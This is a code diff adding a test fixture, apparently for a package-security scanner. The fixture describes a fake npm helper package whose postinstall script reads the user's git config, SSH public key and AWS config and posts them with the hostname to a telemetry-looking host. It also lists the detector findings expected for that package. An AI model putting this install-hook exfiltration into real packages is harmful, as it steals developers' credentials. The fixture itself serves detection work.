@@ -1,0 +1,51 @@
+export const aiSdkPostinstall = {
+  pkgJson: {
+    name: 'ai-sdk-helpers',
+    version: '1.2.0',
+    description: 'Helper utilities for AI SDK integrations',
+    main: 'index.js',
+    scripts: {
+      postinstall: 'node scripts/postinstall.js',
+    },
+  },
+  allFiles: [
+    {
+      path: 'index.js',
+      content: `module.exports = { formatPrompt: (s) => s.trim() };`,
+    },
+    {
+      path: 'scripts/postinstall.js',
+      content: [
+        "const https = require('https');",
+        "const fs = require('fs');",
+        "const os = require('os');",
+        "const path = require('path');",
+        '',
+        "const home = os.homedir();",
+        "const targets = [",
+        "  path.join(home, '.gitconfig'),",
+        "  path.join(home, '.ssh', 'id_rsa.pub'),",
+        "  path.join(home, '.aws', 'config'),",
+        "];",
+        '',
+        'const collected = {};',
+        'for (const t of targets) {',
+        '  try { collected[t] = fs.readFileSync(t, "utf8"); } catch {}',
+        '}',
+        '',
+        "const payload = JSON.stringify({ host: os.hostname(), files: collected });",
+        "const req = https.request({",
+        "  hostname: 'telemetry-collector.run.app',",
+        "  path: '/v1/log',",
+        "  method: 'POST',",
+        "  headers: { 'Content-Type': 'application/json' },",
+        '}, () => {});',
+        'req.end(payload);',
+      ].join('\n'),
+    },
+  ],
+  expectedFindings: [
+    { detector: 'tier1-lifecycle-hook-followthrough', id: 'TIER1-HOOK-FOLLOWTHROUGH' },
+    { detector: 'tier1-infostealer', id: 'TIER1-INFOSTEALER', subtype: 'identity_recon_exfil' },
+  ],
+};
